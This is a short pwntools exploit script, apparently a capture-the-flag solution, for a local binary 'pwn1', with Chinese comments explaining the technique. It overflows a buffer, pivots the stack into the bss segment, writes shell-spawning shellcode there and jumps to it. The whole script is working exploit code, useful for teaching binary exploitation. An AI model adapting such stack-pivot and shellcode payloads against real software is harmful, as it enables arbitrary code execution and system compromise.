from pwn import *
context(log_level = 'debug', arch = 'amd64')
p = process("./pwn1")

e = ELF("./pwn1")

vul = 0x400691
buf = e.bss()+0x500 # 随便开一个bss段上保证空白的地址就行

log.info('buf' + hex(buf))
shellcode = asm(shellcraft.sh()) # 自动写shellcode，建议大家手动写一下

p.recvuntil('1nter3sting.\n')
payload = b'a'*0x100 + p64(buf+0x100) + p64(vul) 
# rbp被改成了bss端口，返回值修改为vul函数，使得重新开启的栈在bss段，这也是要+0x100的原因，方便之后的shellcode执行

p.send(payload)

payload = shellcode
payload = payload.ljust(0x108, b'\x00') +p64(buf) 
# 在bss段写入shellcode并溢出覆盖rbp 返回值为buf执行shellcode

print(hex(len(payload)))
p.sendline(payload)
p.interactive()